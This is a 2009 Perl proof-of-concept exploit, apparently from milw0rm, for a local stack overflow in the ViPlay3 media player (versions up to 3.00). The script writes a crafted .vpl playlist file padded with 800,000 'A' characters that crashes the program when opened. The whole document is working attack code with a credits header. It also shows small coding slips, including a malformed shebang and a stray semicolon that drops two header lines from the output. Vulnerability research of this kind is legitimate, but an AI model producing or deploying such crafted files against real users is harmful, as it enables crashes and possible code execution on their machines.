#/usr/bin/perl
#
# ViPlay3 <= 3.00 (.vpl) Local Stack Overflow PoC
#
# Product web page: http://www.urusoft.net/
# Tested on Microsoft Windows XP Professional SP3 (English)
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# liquidworm gmail com
# http://www.zeroscience.org/
# 08.05.2009

$b= "[General]\r\n".
    "Title=Proof of Concept\r\n".
    "Author=LiquidWorm\r\n".
    "Comments=2009\r\n".
    "Version=1.0\r\n".
    "[Files]\r\n";
    "Count=800000\r\n".
    "LastPlayed=0\r\n";
$c= "1=" . "A" x 800000 . "\r\n";
open a, ">./lqwrm.vpl";
print a $b.$c;
close a;
print "\n- Done!\n";

# milw0rm.com [2009-05-08]